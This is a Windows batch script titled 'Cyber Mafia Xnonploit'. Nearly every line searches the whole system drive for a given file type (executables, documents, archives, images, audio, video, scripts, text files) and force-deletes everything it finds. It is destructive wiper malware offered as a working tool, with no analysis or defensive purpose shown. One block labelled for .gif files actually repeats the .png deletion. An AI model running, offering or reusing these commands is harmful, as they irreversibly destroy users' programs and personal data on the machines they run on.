:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off

::-------Delete All .Exe-----::
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Mp3-----::
DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Rar-----::
DIR /S/B %SystemDrive%\*.rar >> FIleList_rar.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_rar.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Doc-----::
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Bat-----::
DIR /S/B %SystemDrive%\*.bat >> FIleList_bat.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_bat.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Png-----::
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Xml-----::
DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xml.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Vb------::
DIR /S/B %SystemDrive%\*.vb >> FIleList_vb.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_vb.txt) do del "%%j:%%k"
::---------------------------::
::------Delete All .Resx-----::
DIR /S/B %SystemDrive%\*.resx >> FIleList_resx.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_resx.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Pdf-----::
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Gif-----::
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Vbs-----::
DIR /S/B %SystemDrive%\*.vbs >> FIleList_vbs.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_vbs.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Txt-----::
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Zip-----::
DIR /S/B %SystemDrive%\*.zip >> FIleList_zip.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_zip.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Mp4-----::
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Jpg-----::
DIR /S/B %SystemDrive%\*.jpg >> FIleList_jpg.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_jpg.txt) do del "%%j:%%k"
::---------------------------::
